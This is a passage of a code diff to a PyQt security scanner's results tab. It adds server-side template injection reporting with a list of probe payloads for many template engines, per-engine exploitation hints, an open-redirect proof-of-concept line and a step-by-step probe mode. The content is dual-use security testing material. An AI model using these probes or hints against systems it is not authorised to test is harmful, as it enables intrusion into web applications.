             ("open_redirect",  "=== OPEN REDIRECT SCAN ===",                            "format_open_redirect_results"),
+            ("ssti",           "=== SERVER-SIDE TEMPLATE INJECTION (SSTI) SCAN ===",    "format_ssti_results"),
         ]
 
         multi = any(k in results for k, _, _ in SECTIONS
@@ -4570,6 +4978,7 @@ class ScannerTab(QWidget):
                 "NoSQLi": "format_nosqli_results",
                 "CORS":         "format_cors_results",
                 "OpenRedirect": "format_open_redirect_results",
+                "SSTI":         "format_ssti_results",
             }.get(st)
             if fmt:
                 lines.extend(getattr(self, fmt)(results))
@@ -5040,6 +5449,104 @@ class ScannerTab(QWidget):
             # Exploitation PoC
             lines.append(f"       ⚡ PoC — attacker page that triggers redirect:")
             lines.append( "       <a href=\"" + url + "\">Click here</a>")
+            lines.append("")
+
+        return lines
+
+    def format_ssti_results(self, result: Dict[str, Any]) -> List[str]:
+        """Format Server-Side Template Injection scan results."""
+        lines = []
+
+        if not result:
+            lines.append("  No results available.")
+            return lines
+
+        if "error" in result and not result.get("details"):
+            lines.append(f"  ❌ Error: {result['error']}")
+            return lines
+
+        vulnerable = result.get("vulnerable", False)
+        summary    = result.get("summary", "")
+        stats      = result.get("stats", {})
+
+        lines.append(f"  Status  : {'⚠️  VULNERABLE' if vulnerable else '✓ NOT VULNERABLE'}")
+        lines.append(f"  Summary : {summary}")
+        lines.append(
+            f"  Stats   : {stats.get('params_tested', 0)} parameter(s) tested | "
+            f"{stats.get('payloads_sent', 0)} request(s) sent | "
+            f"{stats.get('findings', 0)} finding(s)"
+        )
+        lines.append("")
+
+        if not vulnerable:
+            lines.append("  ✓ No SSTI vulnerabilities detected.")
+            lines.append("")
+            lines.append("  Probe syntax tested across all injection points:")
+            for item in [
+                "{{7*7}}                — Jinja2 / Twig / Pebble / Tornado",
+                "${7*7}                — Freemarker / Mako / Spring-EL / Velocity",
+                "#{7*7}                — Thymeleaf / Pebble / Java-EL",
+                "<%= 7*7 %>            — ERB (Ruby) / EJS (Node.js)",
+                "*{7*7}                — Spring Thymeleaf OGNL",
+                "${{7*7}}              — Spring expression wrapper",
+                "[[${7*7}]]            — Thymeleaf inline",
+                "}}{{7*7}}{{           — Code-context break-out (Jinja2/Twig)",
+                "}${7*7}{              — Code-context break-out (Freemarker/EL)",
+                "${{<%[%'\"}}%\\       — Polyglot error probe (all engines)",
+            ]:
+                lines.append(f"    • {item}")
+            return lines
+
+        details = result.get("details", [])
+
+        _CONF_ICON = {"HIGH": "🔴", "MEDIUM": "⚠️", "LOW": "🔵"}
+        _CONF_ORDER = {"HIGH": 0, "MEDIUM": 1, "LOW": 2}
+        sorted_details = sorted(
+            details,
+            key=lambda d: _CONF_ORDER.get(d.get("confidence", "LOW"), 9)
+        )
+
+        lines.append(f"  ⚠️  {len(sorted_details)} finding(s):")
+        lines.append("")
+
+        for i, d in enumerate(sorted_details, 1):
+            conf       = d.get("confidence", "?")
+            icon       = _CONF_ICON.get(conf, "•")
+            param      = d.get("parameter", "?")
+            ptype      = d.get("param_type", "url")
+            engine     = d.get("engine", "Unknown")
+            err_engine = d.get("error_engine", "")
+            orig_val   = d.get("original_value", "")
+            url        = d.get("url", "")
+            method     = d.get("method", "GET")
+            hit_list   = d.get("hit_payloads", [])
+
+            lines.append(f"  {'─' * 68}")
+            lines.append(f"  [{i}] {icon} [{conf}]  Parameter: {param}  ({ptype})")
+            lines.append(f"  {'─' * 68}")
+            lines.append(f"       Template Engine  : {engine}")
+            if err_engine and err_engine != engine:
+                lines.append(f"       Error Signature  : {err_engine}")
+            lines.append(f"       Original Value   : {orig_val[:80] if orig_val else '(empty)'}")
+            lines.append(f"       Endpoint         : {method} {url}")
+            lines.append("")
+
+            if hit_list:
+                lines.append(f"       Successful probe(s):")
+                for hp in hit_list:
+                    snippet = hp.get("resp_snippet", "")
+                    lines.append(f"         • [{hp.get('label','')}]  {hp.get('payload','')}  "
+                                 f"→ expected '{hp.get('expected','')}' ({hp.get('engines','')})")
+                    if snippet:
+                        lines.append(f"           Context: {snippet[:120]}")
+            lines.append("")
+
+            # Exploitation guidance per engine
+            expl = _SSTI_EXPLOIT_HINTS.get(engine, _SSTI_EXPLOIT_HINTS.get("Generic", []))
+            if expl:
+                lines.append(f"       ⚡ Exploitation guidance ({engine}):")
+                for hint in expl:
+                    lines.append(f"         {hint}")
             lines.append("")
 
         return lines
@@ -5769,13 +6276,42 @@ class ScannerTab(QWidget):
     def stop_scan(self):
         """Stop the current scan"""
         if self.current_scan_worker and self.current_scan_worker.isRunning():
+            # Unblock the step gate so the thread can notice running=False and exit
+            if getattr(self.current_scan_worker, 'step_mode', False):
+                self.current_scan_worker._step_event.set()
             self.current_scan_worker.stop()
             self.current_scan_worker.wait()
             self.scan_status_label.setText("⏹ Scan stopped")
             self.start_scan_btn.setEnabled(True)
             self.stop_scan_btn.setEnabled(False)
             self.progress_bar.setVisible(False)
+            self.step_next_btn.setVisible(False)
+            self.step_next_btn.setEnabled(False)
     
+    # ── One-by-one step mode slots ─────────────────────────────────────────────
+
+    def _on_step_paused(self, label: str):
+        """
+        Called from the scan thread (via queued signal) after a probe request
+        finishes.  Enables the Next button and updates the status bar.
+        """
+        self.step_next_btn.setEnabled(True)
+        short = (label[:48] + "…") if len(label) > 48 else label
+        self.scan_status_label.setText(f"⏸ Paused — click ⏩ Next to continue  [{short}]")
+
+    def _on_step_next_clicked(self):
+        """
+        User clicked the Next button.  Disable it immediately (re-enabled by
+        _on_step_paused after the next request), then unblock the worker thread.
+        """
+        self.step_next_btn.setEnabled(False)
+        self.scan_status_label.setText("▶ Sending next probe…")
+        worker = self.current_scan_worker
+        if worker and worker.isRunning():
+            worker._step_event.set()
+
+    # ──────────────────────────────────────────────────────────────────────────
+
     def clear_results_and_logs(self):
         """Clear all results and logs"""
         reply = QMessageBox.question(
